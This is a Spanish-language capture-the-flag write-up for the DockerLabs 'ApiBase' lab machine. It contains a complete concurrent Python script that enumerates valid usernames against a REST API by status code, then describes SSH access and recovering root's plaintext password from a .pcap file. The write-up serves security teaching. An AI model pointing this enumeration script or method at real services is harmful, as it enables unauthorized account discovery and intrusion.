## Introducción

Este documento presenta la resolución completa de la máquina **ApiBase**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone una API REST en el puerto 5000 que permite la enumeración de usuarios mediante el endpoint `/users`, el cual devuelve diferentes códigos de estado según la existencia del usuario. Tras desarrollar un script para automatizar la enumeración, se identifica al usuario `Pingu` como válido.
Con las credenciales obtenidas, se accede al sistema vía SSH. Una vez dentro, se encuentra un archivo de captura de red (`.pcap`) que contiene credenciales en texto plano del usuario `root`, permitiendo el acceso directo al sistema como administrador sin necesidad de técnicas de escalada adicionales.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Automatización de enumeración de usuarios

Se desarrolla un script en Python para automatizar la enumeración de usuarios mediante peticiones concurrentes al endpoint `/users`:

```python
# enum_users_fast.py
import http.client
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import argparse

HOST = "172.17.0.2"
PORT = 5000
ENDPOINT = "/users"
BODY_PREVIEW = 200

def check_user(host, port, endpoint, username, timeout=8, retries=1):
    username_q = quote_plus(username)
    path = f"{endpoint}?username={username_q}"
    for attempt in range(retries + 1):
        conn = http.client.HTTPConnection(f"{host}:{port}", timeout=timeout)
        try:
            conn.request("GET", path)
            res = conn.getresponse()
            body = res.read().decode("utf-8", errors="replace")
            return username, res.status, body
        except Exception as e:
            last_exc = e
        finally:
            try:
                conn.close()
            except:
                pass
    return username, None, f"Error: {last_exc}"

def main(args):
    with open(args.input_file, "r", encoding=args.encoding, errors="ignore") as f:
        users = [line.strip() for line in f if line.strip()]

    print(f"[*] Cargando {len(users)} usuarios desde {args.input_file}...")
    total = 0
    useful = 0
    start = time.time()

    with ThreadPoolExecutor(max_workers=args.max_workers) as executor:
        futures = {executor.submit(check_user, HOST, PORT, ENDPOINT, u, args.timeout, args.retries): u for u in users}

        for future in as_completed(futures):
            total += 1
            username, status, body = future.result()

            if status is not None and status != 404:
                useful += 1
                preview = body[:BODY_PREVIEW] + ("..." if len(body) > BODY_PREVIEW else "")
                print(f"[ÚTIL] {username} -> {status}")
                print(preview)
                print("-" * 60)

            if total % 100 == 0:
                elapsed = time.time() - start
                print(f"[+] Progreso: {total}/{len(users)} (tiempo: {elapsed:.1f}s)")

    elapsed = time.time() - start
    print(f"\nResumen: probados = {total}, útiles (no-404) = {useful}, tiempo = {elapsed:.2f}s")

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Enumera usuarios via /users?username= on ApiBase")
    p.add_argument("--input-file", default="/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt")
    p.add_argument("--max-workers", type=int, default=20)
    p.add_argument("--timeout", type=int, default=8)
    p.add_argument("--retries", type=int, default=1)
    p.add_argument("--encoding", default="latin-1")
    args = p.parse_args()
    main(args)
```

Se ejecuta el script:

```bash
python3 enum_users_fast.py
```

## Paso 3 — Escalada de privilegios

### 3.1 De Pingu → root

Una vez dentro como `Pingu`, se realiza una enumeración básica del sistema:

- `sudo -l` no está disponible.
- No se encuentran binarios con bit SUID evidentes.
- Se busca archivos interesantes: scripts, copias de seguridad, capturas de red.

Se identifica un archivo `.pcap` (captura de tráfico) accesible por el usuario.

![Ls](https://res.cloudinary.com/dewqswzke/image/upload/v1760687659/Ls_k8z0dc.png)

La apertura del `.pcap` con Wireshark/tshark revela credenciales en texto plano dentro de la captura.

![Pcap](https://res.cloudinary.com/dewqswzke/image/upload/v1760685819/Wireshark_gjkczf.png)

En la captura aparece una contraseña usable para la cuenta `root`. Con esa contraseña se inicia sesión como root:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1760685818/Root_fufstf.png)
